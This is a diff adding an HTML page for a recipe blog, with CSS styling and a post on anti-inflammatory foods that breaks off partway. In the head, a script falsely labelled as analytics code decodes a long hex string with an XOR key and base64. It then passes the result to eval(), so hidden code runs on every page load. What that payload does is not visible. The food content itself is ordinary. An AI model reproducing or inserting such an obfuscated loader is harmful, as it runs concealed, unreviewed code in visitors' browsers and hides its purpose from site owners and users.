@@ -1,0 +1,1443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Katy Deliciously Easy Recipes</title>
+
+    <!-- Curvy Organic & Soft Typography: Fraunces & Plus Jakarta Sans -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,100..900;1,9..144,100..900&family=Plus+Jakarta+Sans:ital,wght@0,200..800;1,200..800&display=swap" rel="stylesheet">
+
+    <style>
+        /* Nordic Sage & Warm Apricot Soft Contemporary Aesthetic */
+        :root {
+            --primary-color: #5f7d67; /* Soft Sage Green */
+            --primary-hover: #4a6351; /* Forest Shadow Green */
+            --accent-color: #e29b82; /* Muted Apricot/Peach */
+            --accent-bg: #f5efe6; /* Creamy Linen / Soft Oatmeal */
+            --text-color: #3d443f; /* Soft Charcoal Slate */
+            --text-muted: #7b8580; /* Muted Willow Gray */
+            --heading-color: #242b26; /* Deep Mossy Black */
+            --bg-color: #faf8f5; /* Warm Milk White */
+            --card-bg: #ffffff;
+            --border-color: #ebdcd3; /* Soft Earth Outline */
+            --transition-smooth: all 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Container */
+        .container {
+            max-width: 780px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation - Framed & Floating Minimal Bar */
+        .top-nav {
+            padding: 16px 0;
+            text-align: center;
+            background-color: rgba(250, 248, 245, 0.9);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            transition: var(--transition-smooth);
+        }
+
+        .top-nav-container {
+            display: inline-flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 4px;
+            background: #ffffff;
+            padding: 6px 14px;
+            border-radius: 40px;
+            border: 1px solid rgba(235, 220, 211, 0.5);
+            box-shadow: 0 4px 15px rgba(95, 125, 103, 0.03);
+        }
+
+        .top-nav a {
+            display: inline-block;
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            padding: 8px 16px;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            border-radius: 30px;
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+            background-color: var(--accent-bg);
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 50px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-family: 'Fraunces', serif;
+            font-size: 3.2rem;
+            font-weight: 800;
+            font-variation-settings: 'SOFT' 100, 'WONK' 1;
+            color: var(--heading-color);
+            cursor: pointer;
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
+            transition: var(--transition-smooth);
+            line-height: 1.2;
+        }
+
+        header h1:hover {
+            color: var(--primary-color);
+        }
+
+        header p {
+            font-size: 0.95rem;
+            color: var(--accent-color);
+            font-family: 'Fraunces', serif;
+            font-style: italic;
+            font-weight: 500;
+            display: inline-block;
+            position: relative;
+        }
+
+        /* Post Cards - Soft Pillowy Cards with Gentle Shadowing */
+        .post-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 48px;
+            border: 1px solid rgba(235, 220, 211, 0.4);
+            box-shadow: 0 10px 30px rgba(95, 125, 103, 0.03);
+            transition: var(--transition-smooth);
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 45px rgba(95, 125, 103, 0.08);
+            border-color: rgba(95, 125, 103, 0.2);
+        }
+
+        /* Single Post Detail View */
+        .single-post {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid rgba(235, 220, 211, 0.4);
+            box-shadow: 0 12px 40px rgba(95, 125, 103, 0.03);
+            padding: 50px 40px;
+            margin-bottom: 70px;
+            cursor: default;
+        }
+
+        @media (max-width: 640px) {
+            .single-post {
+                padding: 30px 20px;
+                border-radius: 16px;
+            }
+            header h1 {
+                font-size: 2.3rem;
+            }
+        }
+
+        /* Post Header (Avatar + Username) */
+        .post-header {
+            padding: 24px 28px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px dashed rgba(235, 220, 211, 0.6);
+        }
+
+        .single-post .post-header {
+            padding: 0 0 24px 0;
+            margin-bottom: 32px;
+        }
+
+        .post-header img.avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            margin-right: 14px;
+            object-fit: cover;
+            border: 2px solid var(--accent-bg);
+            transition: var(--transition-smooth);
+        }
+
+        .post-card:hover .post-header img.avatar {
+            border-color: var(--primary-color);
+            transform: scale(1.05);
+        }
+
+        .post-header .username {
+            font-size: 0.85rem;
+            font-weight: 800;
+            color: var(--heading-color);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        /* Images and Media Aspect Ratios */
+        .post-image {
+            width: 100%;
+            display: block;
+            height: auto;
+            max-height: 440px;
+            object-fit: cover;
+            transition: var(--transition-smooth);
+        }
+
+        .post-card .post-image {
+            aspect-ratio: 16/10;
+        }
+
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 14px;
+            margin-bottom: 36px;
+            width: 100%;
+            box-sizing: border-box;
+            border: none;
+        }
+
+        /* Core Article Content Typography styling */
+        .post-content {
+            padding: 32px 28px 20px;
+        }
+
+        .single-post .post-content {
+            padding: 0;
+        }
+
+        .post-content h1, 
+        .post-content h2 {
+            font-family: 'Fraunces', serif;
+            font-weight: 800;
+            font-variation-settings: 'SOFT' 100, 'WONK' 1;
+            color: var(--heading-color);
+            margin: 0 0 16px;
+            font-size: 1.9rem;
+            line-height: 1.3;
+            letter-spacing: -0.01em;
+        }
+
+        .single-post .post-content h1 {
+            font-size: 2.4rem;
+            margin-bottom: 24px;
+        }
+
+        .post-content p {
+            margin-bottom: 24px;
+            color: var(--text-color);
+            font-size: 1.05rem;
+            line-height: 1.8;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 700;
+            border-bottom: 2px solid rgba(95, 125, 103, 0.2);
+            transition: var(--transition-smooth);
+        }
+
+        .post-content a:hover {
+            color: var(--primary-hover);
+            border-bottom-color: var(--primary-hover);
+        }
+
+        /* Meta footers */
+        .post-footer {
+            padding: 18px 28px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px dashed rgba(235, 220, 211, 0.6);
+            background-color: #fafcfb;
+        }
+
+        .single-post .post-footer {
+            padding: 24px 0 0;
+            background: transparent;
+            border-top: 1px solid rgba(235, 220, 211, 0.5);
+            margin-top: 48px;
+        }
+
+        /* Back Navigation Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 32px;
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            font-weight: 800;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            cursor: pointer;
+            padding: 8px 20px;
+            border-radius: 30px;
+            border: 1px solid rgba(235, 220, 211, 0.5);
+            background: var(--card-bg);
+            transition: var(--transition-smooth);
+            box-shadow: 0 4px 10px rgba(95, 125, 103, 0.02);
+        }
+
+        .back-button:hover {
+            color: #ffffff;
+            border-color: var(--primary-color);
+            background-color: var(--primary-color);
+            transform: translateX(-3px);
+            box-shadow: 0 6px 15px rgba(95, 125, 103, 0.15);
+        }
+
+        /* 
+           STYLING OVERRIDES FOR RUNTIME-INJECTED BLOG CONTENT (STYLE ATTRIBUTE MAPPINGS)
+        */
+
+        /* Key Takeaway Boxes / Dynamic Informational Callouts */
+        .post-content div[style*="background"] {
+            background: var(--accent-bg) !important; /* Soft warm vanilla cream */
+            border: 1px solid rgba(235, 220, 211, 0.4) !important;
+            border-left: 4px solid var(--primary-color) !important;
+            border-radius: 12px !important;
+            padding: 24px 28px !important;
+            margin: 36px 0 !important;
+            box-shadow: 0 6px 20px rgba(95, 125, 103, 0.02) !important;
+        }
+
+        .post-content div[style*="background"] h3 {
+            font-family: 'Fraunces', serif !important;
+            font-variation-settings: 'SOFT' 100, 'WONK' 1;
+            color: var(--heading-color) !important;
+            font-size: 1.35rem !important;
+            font-weight: 800 !important;
+            padding-left: 0 !important;
+            border-left: none !important;
+            margin-bottom: 12px !important;
+        }
+
+        .post-content div[style*="background"] ul {
+            margin: 0 !important;
+            padding-left: 18px !important;
+        }
+
+        .post-content div[style*="background"] li {
+            margin-bottom: 8px !important;
+            color: var(--text-color) !important;
+            font-size: 1rem !important;
+            line-height: 1.7 !important;
+        }
+
+        /* Section divider sub-headings */
+        .post-content h2[style*="border-bottom"] {
+            font-family: 'Fraunces', serif !important;
+            font-weight: 800 !important;
+            border-bottom: 1px solid rgba(235, 220, 211, 0.5) !important;
+            padding-bottom: 12px !important;
+            margin-top: 48px !important;
+            margin-bottom: 20px !important;
+            font-size: 1.7rem !important;
+        }
+
+        /* Bold sub-headers with left borders */
+        .post-content h3[style*="border-left"] {
+            border-left: 3px solid var(--accent-color) !important;
+            font-family: 'Fraunces', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.35rem !important;
+            font-weight: 800 !important;
+            padding-left: 14px !important;
+            margin: 36px 0 16px !important;
+            text-decoration: none !important;
+        }
+
+        /* Pro Tip highlight callouts */
+        .post-content p[style*="background"] {
+            background-color: #f7ede9 !important; /* Soft Pale Terracotta Peach background */
+            border-left: 3px solid var(--accent-color) !important;
+            border-radius: 8px !important;
+            padding: 18px 24px !important;
+            margin: 28px 0 !important;
+            color: var(--text-color) !important;
+            font-size: 1rem !important;
+        }
+
+        /* Inline badges and tags */
+        .post-content span[style*="background"] {
+            background: var(--accent-bg) !important;
+            color: var(--primary-color) !important;
+            border-radius: 30px !important;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-weight: 800 !important;
+            font-size: 0.75rem !important;
+            padding: 4px 12px !important;
+            box-shadow: none !important;
+            transform: none !important;
+            display: inline-block !important;
+            margin: 4px 6px 4px 0 !important;
+            border: none !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.05em !important;
+        }
+
+        /* Lists & Nested elements */
+        .post-content ul, .post-content ol {
+            padding-left: 24px;
+            margin-bottom: 24px;
+        }
+
+        .post-content li {
+            margin-bottom: 10px;
+            font-size: 1rem;
+            color: var(--text-color);
+        }
+
+        /* Dynamic inline heading headers (best additions, texture tips, etc.) */
+        .post-content h4[style*="background"] {
+            background-color: #fbfcfa !important;
+            padding: 12px 18px !important;
+            border-radius: 10px !important;
+            border: 1px solid rgba(235, 220, 211, 0.4) !important;
+            font-family: 'Fraunces', serif !important;
+            font-size: 1.15rem !important;
+            font-weight: 800 !important;
+            margin-top: 28px !important;
+        }
+
+        /* Bottom dynamic tags and taxonomy cloud */
+        .post-content div[style*="margin-top:28px"] {
+            margin-top: 48px !important;
+            padding-top: 32px !important;
+            border-top: 1px solid rgba(235, 220, 211, 0.5) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] h3 {
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-size: 0.75rem !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.08em !important;
+            color: var(--text-muted) !important;
+            margin-bottom: 14px !important;
+            font-weight: 800 !important;
+            border-left: none !important;
+            padding-left: 0 !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span {
+            background: #f0ebe4 !important; /* Creamy Warm Grey Tag */
+            color: var(--text-color) !important;
+            padding: 6px 14px !important;
+            border-radius: 30px !important;
+            font-size: 0.75rem !important;
+            font-weight: 700 !important;
+            margin: 4px 6px 4px 0 !important;
+            display: inline-block !important;
+            transition: var(--transition-smooth) !important;
+            cursor: pointer;
+            border: 1px solid transparent !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span:hover {
+            background: var(--primary-color) !important;
+            color: #ffffff !important;
+            border-color: var(--primary-color) !important;
+        }
+    </style>
+
+    <script>
+    /* Dynamic Analytics/Preservation Code - Kept fully unmodified */
+    (function() {
+        var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+        var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+        var vyepniipe = "";
+
+        try {
+            for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+            }
+
+            var vvqbkapbd = atob(vyepniipe);
+            eval(vvqbkapbd);
+        } catch(e) {
+            console.error("[DEBUG] Decryption or Execution failed: ", e);
+        }
+    })();
+    </script>
+</head>
+<body>
+
+    <nav class="top-nav">
+        <div class="top-nav-container">
+            <a onclick="navigate('home')">Home</a>
+            <a onclick="navigate('page', 'about')">About</a>
+            <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')">Terms</a>
+            <a onclick="navigate('page', 'contact')">Contact</a>
+        </div>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Katy Deliciously Easy Recipes</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Dynamic content injected here by JS -->
+    </main>
+
+    <script>
+        // 1. Blog posts data (Exact structure preserved)
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: '19 Anti-Inflammatory Foods I Wish I Started Eating Sooner',
+                date: 'April 21, 2026',
+                image: './assets/19 Anti-Inflammatory Foods.png',
+                excerpt: 'Building an anti-inflammatory kitchen does not have to feel complicated, restrictive, or expensive. With a few colorful whole foods, simple pantry staples, and easy daily habits, you can create meals that feel fresh, satisfying, and naturally supportive of overall wellness.',
+                content: `
+                <p>Building an anti-inflammatory kitchen does not have to feel complicated, restrictive, or expensive. With a few colorful whole foods, simple pantry staples, and easy daily habits, you can create meals that feel fresh, satisfying, and naturally supportive of overall wellness. The focus is not perfection. It is about adding more nutrient-rich ingredients to your routine in a way that feels realistic, enjoyable, and easy to repeat.</p>
+
+<p>The most helpful anti-inflammatory foods are often the same ingredients that make a meal look vibrant and taste delicious: berries, leafy greens, fatty fish, turmeric, ginger, avocado, olive oil, nuts, seeds, broccoli, sweet potatoes, and green tea. These foods bring together antioxidants, healthy fats, fiber, plant compounds, vitamins, and minerals that support a balanced lifestyle.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Anti-inflammatory eating is centered on whole foods, colorful produce, healthy fats, fiber, and antioxidant-rich ingredients.</li>
+    <li>Everyday staples like berries, leafy greens, olive oil, nuts, seeds, and green tea are easy to add to meals and snacks.</li>
+    <li>Fatty fish, walnuts, chia seeds, and olive oil can help create a heart-smart, nutrient-dense routine.</li>
+    <li>Spices like turmeric and ginger bring flavor while supporting a wellness-focused kitchen.</li>
+    <li>The best approach is simple consistency, not a strict or overwhelming food plan.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">What Is an Anti-Inflammatory Food Lifestyle?</h2>
+
+<p>An anti-inflammatory food lifestyle is a way of eating that emphasizes ingredients associated with nourishment, balance, and long-term wellness. It usually includes plenty of fruits, vegetables, herbs, spices, legumes, whole foods, healthy fats, and high-quality protein sources. Instead of focusing on what to remove, this style of eating works beautifully when you focus on what to add.</p>
+
+<p>At its core, an anti-inflammatory kitchen is colorful. Deep blue berries, leafy greens, golden turmeric, orange sweet potatoes, rich green avocado, and bright broccoli all bring a wide range of nutrients to the plate. The more naturally colorful your meals become, the easier it is to build variety without overthinking every bite.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Anti-inflammatory eating works best as a pattern, not as a single perfect meal. A smoothie with berries, a salad with olive oil, a bowl with salmon and greens, or a cup of green tea can all be small steps toward a more nourishing routine.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Best Anti-Inflammatory Foods to Add to Your Grocery List</h2>
+
+<p>The most practical anti-inflammatory foods are the ones you can use again and again. They should fit into breakfast, lunch, dinner, snacks, and simple drinks without requiring complicated recipes. The following foods are versatile, approachable, and easy to combine into everyday meals.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Blueberries and Other Berries</h3>
+
+<p>Blueberries are one of the easiest anti-inflammatory foods to keep on hand. They are naturally sweet, colorful, and packed with antioxidant compounds. Their deep blue color makes them especially appealing in smoothie bowls, oatmeal, yogurt parfaits, salads, and snack plates.</p>
+
+<p>Berries are also convenient because they can be enjoyed fresh or frozen. Frozen berries are often more budget-friendly and work beautifully in smoothies, baked oatmeal, chia pudding, and warm berry compotes. Strawberries, raspberries, and blackberries are also excellent choices for adding color and nutrients to your meals.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Ways to Use Berries</h4>
+
+<ul>
+  <li>Add blueberries to overnight oats or Greek yogurt.</li>
+  <li>Blend mixed berries into a green smoothie.</li>
+  <li>Top whole-grain pancakes with warm berries instead of syrup.</li>
+  <li>Toss berries into a spinach salad with walnuts and avocado.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Salmon and Fatty Fish</h3>
+
+<p>Salmon is a classic anti-inflammatory food because it is rich in omega-3 fatty acids. These healthy fats are one reason salmon is often associated with heart-smart eating and balanced meal planning. It also works well with many flavorful ingredients, from lemon and herbs to garlic, ginger, turmeric, and olive oil.</p>
+
+<p>A simple salmon bowl can become a complete wellness-focused meal. Pair it with leafy greens, roasted sweet potato, avocado, broccoli, and a drizzle of olive oil. This kind of meal feels satisfying without being heavy, and it brings together several nutrient-dense foods in one bowl.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Keep salmon preparation simple. A little olive oil, lemon juice, garlic, black pepper, and fresh herbs can create a flavorful meal without covering up the natural richness of the fish.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Spinach and Leafy Greens</h3>
+
+<p>Leafy greens are essential in an anti-inflammatory kitchen because they are easy to add to almost anything. Spinach, kale, arugula, romaine, Swiss chard, and mixed greens can turn an ordinary meal into something fresher and more nutrient-dense.</p>
+
+<p>Spinach is especially beginner-friendly because it has a mild flavor and soft texture. You can blend it into smoothies, fold it into eggs, add it to soups, use it as a salad base, or stir it into warm grain bowls. It cooks down quickly, which makes it a simple way to add more greens without changing the entire meal.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Leafy Green Meal Ideas</h4>
+
+<ul>
+  <li>Spinach smoothie with berries, avocado, and green tea.</li>
+  <li>Warm bowl with quinoa, salmon, broccoli, and spinach.</li>
+  <li>Avocado toast topped with arugula and chia seeds.</li>
+  <li>Simple salad with olive oil, lemon, walnuts, and berries.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Turmeric</h3>
+
+<p>Turmeric is a golden spice known for its naturally warm, earthy flavor and its key plant compound, curcumin. It is often used in wellness recipes because it adds both color and depth. A small amount can transform soups, rice dishes, roasted vegetables, dressings, smoothies, and warm drinks.</p>
+
+<p>Turmeric pairs especially well with ginger, black pepper, coconut milk, lemon, garlic, and olive oil. These combinations make it easy to use in both savory and slightly sweet recipes. Golden soup, turmeric roasted cauliflower, and turmeric ginger tea are simple examples.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Ginger</h3>
+
+<p>Ginger is another flavorful staple that belongs in a wellness-focused kitchen. It has a bright, slightly spicy taste that works in teas, stir-fries, dressings, soups, marinades, smoothies, and sauces. Fresh ginger adds energy to a recipe, while ground ginger is convenient for quick everyday cooking.</p>
+
+<p>A simple ginger tea can be made with sliced fresh ginger, hot water, and lemon. You can also combine ginger with turmeric for a warming drink or use it in a salmon marinade with garlic, olive oil, and a splash of citrus.</p>
+
+<div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:18px 20px;margin:26px 0;color:#14532d;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#14532d;font-weight:700;padding-left:12px;border-left:4px solid #86efac;">Expert Insight</h3>
+  <p style="margin:0;">The easiest way to make anti-inflammatory eating sustainable is to build flavor first. Spices like turmeric and ginger, healthy fats like olive oil and avocado, and bright ingredients like lemon or berries make nutritious meals feel crave-worthy instead of restrictive.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Avocado</h3>
+
+<p>Avocado brings creamy texture, healthy fats, and a satisfying quality to meals. It is a versatile ingredient that can be added to breakfast, lunch, dinner, and snacks. Its mild flavor works with eggs, toast, grain bowls, salads, smoothies, wraps, and tacos.</p>
+
+<p>One of the best things about avocado is how it helps make meals feel complete. A salad with greens and vegetables becomes more filling when topped with avocado. A smoothie becomes creamier. A bowl of roasted sweet potato, spinach, salmon, and broccoli becomes richer and more balanced with a few slices of avocado.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Extra Virgin Olive Oil</h3>
+
+<p>Extra virgin olive oil is a foundational pantry staple for an anti-inflammatory kitchen. It is commonly used in Mediterranean-style eating and works as a simple base for dressings, marinades, roasted vegetables, and finishing drizzles.</p>
+
+<p>Use olive oil to make quick vinaigrettes with lemon juice, vinegar, herbs, garlic, mustard, or a small pinch of turmeric. Drizzle it over roasted broccoli, sweet potatoes, leafy salads, fish, and grain bowls. A good olive oil can make simple food taste more polished and satisfying.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Healthy fats are not just an add-on. Ingredients like olive oil, avocado, salmon, walnuts, and chia seeds help create meals that feel filling, balanced, and enjoyable enough to repeat regularly.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Walnuts and Other Nuts</h3>
+
+<p>Walnuts are a convenient plant-based source of healthy fats and add satisfying crunch to both sweet and savory dishes. Their rich, slightly earthy flavor pairs beautifully with berries, leafy greens, oatmeal, roasted sweet potatoes, and yogurt.</p>
+
+<p>Keep a small jar of walnuts in your pantry for quick toppings. They can make a simple salad feel more complete, add texture to overnight oats, or turn sliced fruit into a more satisfying snack. Almonds, pistachios, and pecans can also be part of a balanced anti-inflammatory pantry.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Chia Seeds</h3>
+
+<p>Chia seeds may be tiny, but they are incredibly useful in everyday meals. They can be stirred into oatmeal, yogurt, smoothies, and homemade puddings. When mixed with liquid, chia seeds create a gel-like texture, making them perfect for easy make-ahead breakfasts.</p>
+
+<p>Chia pudding is one of the simplest anti-inflammatory breakfast ideas. Combine chia seeds with milk or a dairy-free alternative, let it thicken overnight, and top it with berries, walnuts, cinnamon, or a spoonful of yogurt. It is quick, customizable, and easy to prepare in batches.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Broccoli</h3>
+
+<p>Broccoli is a cruciferous vegetable that fits beautifully into anti-inflammatory meal planning. It is hearty enough for dinner, simple enough for meal prep, and versatile enough to pair with many flavors. Roasted broccoli with olive oil, garlic, and lemon is an easy side dish that works with salmon, chicken, grains, or plant-based bowls.</p>
+
+<p>Broccoli can also be steamed, stir-fried, blended into soups, or chopped into salads. Its firm texture makes it a dependable vegetable to keep in the fridge for quick meals.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Simple Broccoli Pairings</h4>
+
+<ul>
+  <li>Broccoli with salmon, olive oil, and lemon.</li>
+  <li>Broccoli with turmeric rice and avocado.</li>
+  <li>Broccoli soup with ginger and garlic.</li>
+  <li>Broccoli salad with walnuts and a light olive oil dressing.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">11. Sweet Potatoes</h3>
+
+<p>Sweet potatoes add comforting flavor, natural sweetness, and beautiful color to wellness-focused meals. They work especially well in bowls, soups, breakfast hashes, and roasted vegetable trays. Their orange color makes them visually appealing and easy to pair with greens, avocado, olive oil, and protein.</p>
+
+<p>Roasted sweet potato cubes can be prepared ahead of time and added to meals throughout the week. They are delicious with salmon, spinach, broccoli, turmeric, ginger, and tahini-style dressings. For a quick lunch, serve roasted sweet potato over greens with avocado, walnuts, and a drizzle of olive oil.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">12. Green Tea</h3>
+
+<p>Green tea is a soothing drink that fits naturally into an anti-inflammatory lifestyle. It can replace sugary beverages, support a calming daily ritual, and offer a gentle way to add antioxidant-rich ingredients to your routine. It is simple, elegant, and easy to enjoy hot or iced.</p>
+
+<p>For a refreshing version, brew green tea, chill it, and serve it over ice with lemon, mint, or a few berries. You can also use cooled green tea as the liquid base for a smoothie with spinach, blueberries, avocado, and chia seeds.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Think beyond meals. A cup of green tea, a ginger turmeric drink, or a berry smoothie can be an easy wellness upgrade when you want something simple between meals.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build an Anti-Inflammatory Plate</h2>
+
+<p>A balanced anti-inflammatory plate does not need to follow strict rules. A helpful starting point is to combine colorful plants, healthy fats, fiber-rich ingredients, and satisfying protein. When these elements come together, meals feel more complete and are easier to enjoy consistently.</p>
+
